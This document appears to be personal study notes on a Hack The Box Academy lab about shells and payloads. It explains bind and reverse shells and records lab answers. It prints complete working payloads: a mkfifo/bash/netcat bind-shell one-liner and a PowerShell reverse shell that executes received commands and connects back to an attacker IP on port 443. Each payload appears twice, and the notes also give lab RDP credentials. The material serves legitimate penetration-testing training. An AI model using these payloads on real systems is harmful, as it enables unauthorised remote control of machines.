# Shells & Payloads

## Anatomy of a Shell

| **Terminal Emulator**                                          | **Operating System**     |
| -------------------------------------------------------------- | ------------------------ |
| [Windows Terminal](https://github.com/microsoft/terminal)      | Windows                  |
| [cmder](https://cmder.app/)                                    | Windows                  |
| [PuTTY](https://www.putty.org/)                                | Windows                  |
| [kitty](https://sw.kovidgoyal.net/kitty/)                      | Windows, Linux and MacOS |
| [Alacritty](https://github.com/alacritty/alacritty)            | Windows, Linux and MacOS |
| [xterm](https://invisible-island.net/xterm/)                   | Linux                    |
| [GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal) | Linux                    |
| [MATE Terminal](https://github.com/mate-desktop/mate-terminal) | Linux                    |
| [Konsole](https://konsole.kde.org/)                            | Linux                    |
| [Terminal](https://en.wikipedia.org/wiki/Terminal_\(macOS\))   | MacOS                    |
| [iTerm2](https://iterm2.com/)                                  | MacOS                    |

## Bind Shells

In many cases, we will be working to establish a shell on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a `Bind` &/or `Reverse` shell.

#### What Is It?

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

### **Bind Example**

![Bind shell setup: Pentester's system 10.10.14.15 connects to target 10.10.14.20:1337 using netcat command.](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

As seen in the image, we would connect directly with the `IP address` and `port` listening on the target

***

## Practicing with GNU Netcat

First, we need to spawn our attack box or Pwnbox and connect to the Academy network environment. Then make sure our target is started. In this scenario, we will be interacting with an Ubuntu Linux system to understand the nature of a bind shell. To do this, we will be using `netcat` (`nc`) on the client and server.

Once connected to the target box with ssh, start a Netcat listener:

### **No. 1: Server - Target starting Netcat listener**

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.

Back on the client (attack box), we will use nc to connect to the listener we started on the server.

### **No. 2: Client - Attack box connecting to target**

```shell-session
eldeim@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). Once we successfully connect, we can see a `succeeded!` message on the client as shown above and a `received!` message on the server, as seen below.

### **No. 3: Server - Target receiving connection from client**

```shell-session
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```

Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

### **No. 4: Client - Attack box sending message Hello Academy**

```shell-session
eldeim@htb[/htb]$ nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy  
```

Once we type the message and hit enter, we will notice the message is received on the server-side.

### **No. 5: Server - Target receiving Hello Academy message**

```shell-session
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy  
```

> Note: When on the academy network (10.129.x.x/16) we can work with another academy student to connect to their target box and practice the concepts presented in this module.

***

## Establishing a Basic Bind Shell with Netcat

We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

### **No. 1: Server - Binding a Bash shell to the TCP session**

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

### **No. 2: Client - Connecting to bind shell on target**

```shell-session
eldeim@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

### Labs - Questions

* Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?
  * Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?

WTF, obvious... 443

* SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

So... i connect to the victim machine and execute the blind reverse -->

```bash
## Connect victim
ssh htb-student@10.129.201.134
## reverse in victim machine (the ip of victim machine)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134] 777 > /tmp/f
```

Before it, into us machine, we need to connect of this target/victim machine via nc -->

```bash
nc -nv 10.129.201.134 7777
## (UNKNOWN) [10.129.201.134] 7777 (?) open
## htb-student@ubuntu:/customscripts$     
```

***

## Reverse Shells

### Hands-on With A Simple Reverse Shell in Windows

With this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. Let's start the target and begin.

We can start a Netcat listener on our attack box as the target spawns.

#### **Server (`attack box`)**

```shell-session
eldeim@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

This time around with our listener, we are binding it to a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) (`443`), this port usually is for `HTTPS` connections

#### **Client (target)**

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> Note: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.

### Lab - Questions

* When establishing a reverse shell session with a target, will the target act as a client or server?
  * RDP to 10.129.201.51 (ACADEMY-SHELLS-WIN10) with user "htb-student" and password "HTB\_@cademy\_stdnt!"

First, we connect via rdp / xfreerdp to victim machine

```
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.201.51 /clipboard
```

With it, in my attacker machine, set in lisen the nc -->

```
nc -nlvp 443
```

With it, now into the CMD of widnows victim pc (in administrator mode) set the reverse -->

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.117',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

<figure><img src="../../../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box.

```powershell
$env:COMPUTERNAME
## SHELLS-WIN10
```
